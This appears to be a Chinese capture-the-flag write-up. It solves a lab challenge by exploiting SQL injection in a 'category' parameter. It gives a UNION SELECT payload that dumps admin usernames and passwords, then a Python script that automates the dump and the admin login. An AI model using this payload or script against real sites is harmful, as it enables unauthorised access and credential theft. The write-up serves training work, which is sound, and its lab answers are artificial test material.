# X-017-24 Cross 71
## 题目描述

> Try to login as the admin user, you will need to dump the admins table

## 知识点

SQL 注入

## 解题思路

- 观察首页分类筛选参数 `category`，构造注入测试（例如 `' or 1=1-- -`）能改变结果，则存在 SQL 注入。
 - 判断注入位置在 `WHERE ... AND category = '<输入>'`，可用 `UNION SELECT` 方式将后台 `admins` 表中的字段映射到页面可见位置。
 - 页面模板会渲染字段：`title`、`category`、`content(截断)`、`image`，其中 `content` 有文本回显最适合带出敏感信息。
 - 猜测 `admins` 表存在 `username`、`password` 字段，利用 `UNION SELECT` 将 `password` 映射到 `content` 列，得到管理员明文密码。
 - 使用得到的用户名与密码 `POST` 登录 `/admin.php`，页面回显即为 flag。

 关键参数与载荷（URL 编码后）：
 - 注入点：`/index.php?category=...`
 - 核心载荷：`%27%20UNION%20SELECT%201,%20username,%20%27Leaked%27,%20password,%20%27x.jpg%27,%201,%20now()%20FROM%20admins%20--%20-`
 - 说明：`posts` 表有 7 列（id,title,category,content,image,published,created_at），因此 `UNION SELECT` 也按 7 列对齐；将 `password` 放到第 4 列（content 位置）以实现前台回显。

## 解题步骤

1) 注入枚举口令
 - 访问：
   `http://ip32840/index.php?category=%27%20UNION%20SELECT%201,%20username,%20%27Leaked%27,%20password,%20%27x.jpg%27,%201,%20now()%20FROM%20admins%20--%20-`
 - 页面出现一条伪造文章，`title=admin`，`content` 位置回显管理员口令：`ONEverySecurePassword123!`。
 ![image.png](https://x/x12124019236.png)
 2) 管理后台登录拿 Flag
 - 页面滑到最下面点击 [Admin Login](http://ip32840/admin.php)，填写用户名和密码：`username=admin&password=ONEverySecurePassword123!`
 - 返回页面顶部回显 flag：`FLAG`。
![image.png](https://x/x12124057258.png)

## EXP
```python
import re
import requests

base = "http://ip32840"
s = requests.Session()

payload = "%27%20UNION%20SELECT%201,%20username,%20%27Leaked%27,%20password,%20%27x.jpg%27,%201,%20now()%20FROM%20admins%20--%20-"
r = s.get(f"{base}/index.php?category=" + payload)

pass_match = re.findall(r"<p>.*</p>", r.text)
password = pass_match[1].replace("<p>", "").replace("</p>", "").replace(".", "") if pass_match else ""
print("[+] admin password:", password)

headers = {"Content-Type": "application/x-www-form-urlencoded"}
r = s.post(f"{base}/admin.php", data=f"username=admin&password={password}", headers=headers)
flag = re.search(r"FLAG\{.*?\}", r.text)
print("[+] flag:", flag.group(0) if flag else "not found")
```